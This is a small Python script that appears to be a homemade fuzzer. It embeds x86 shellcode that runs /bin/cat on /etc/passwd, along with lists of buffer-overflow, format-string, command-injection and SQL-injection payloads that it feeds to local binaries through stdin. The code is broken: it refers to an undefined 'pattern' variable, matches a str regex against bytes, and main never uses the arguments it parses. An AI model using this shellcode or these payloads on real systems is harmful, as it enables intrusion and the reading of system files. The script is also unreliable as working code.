#!/usr/bin/python3
from subprocess import Popen, PIPE, STDOUT
import time,string,re,base64,glob,argparse

shellcode = ('\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61' \
                '\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80')

organized_payloads = {}
organized_payloads['bof']=['a'*300,"\x8b\x87\x04\x08"*100]
organized_payloads['format']=['%x','%n '*10,'a'*16+' %x']
organized_payloads['rce']=['`ls`','$(ls)','#$(ls)']
organized_payloads['sql']=["'-- ",'"-- ',"' or 'adsa'='adsa"]
organized_payloads['logic']=['; return true','; return True','; return false','; return False']
organized_payloads['misc']=[i*10 for i in string.punctuation]
organized_payloads['whitespace']=[' '*66,'\n'*64,'\t'*32]
organized_payloads['stupid']=['-s','--shell','--exec ls','--exec']

patterns = r'(S|s)egmentation|(F|f)ault|((S|s)tack (S|s)mashing)|(S|s)hell|(B|b)ash|(E|e)xecute'

def b64(payload):
    return base64.b64encode(bytes(payload,'utf-8')).decode('utf-8')


def stdinInput(path,payload):
    try:
        p = Popen([path], stdout=PIPE, stdin=PIPE, stderr=PIPE)
        stdout_data = p.communicate(bytes(payload,'utf-8'),timeout=3)[0]
        print(stdout_data)
        if re.search(pattern,stdout_data):
            print(f'Potential Exploit in {path}')
        
    except Exception as e:
        print("Unable to communicate with the process")
        print(e)
    


def main():
    '''
    for i in organized_payloads.keys():
        print('-'*10+str(i)+'-'*10)
        for j in organized_payloads[i]:
            print(str(j))
        
    path = '/home/austin/Desktop/overwriteme'
    payload = "\x8b\x87\x04\x08"
    for i in range(50,201):
        print(i)
        stdinInput(path,payload*i)
    '''
    
    a = argparse.ArgumentParser()
    a.add_argument('-p','--path',type=str,help='directory to fuzz',action='store',dest='path',required=True)
    a.add_argument('-r','--recurse',help='include to recursively look through directory provided',action='store_true',dest='recurse')
    var = (vars(a.parse_args()))
    path = var['path']
    recurse=('-r' if var['recurse'] else '')
    
if __name__ == '__main__':
    main()
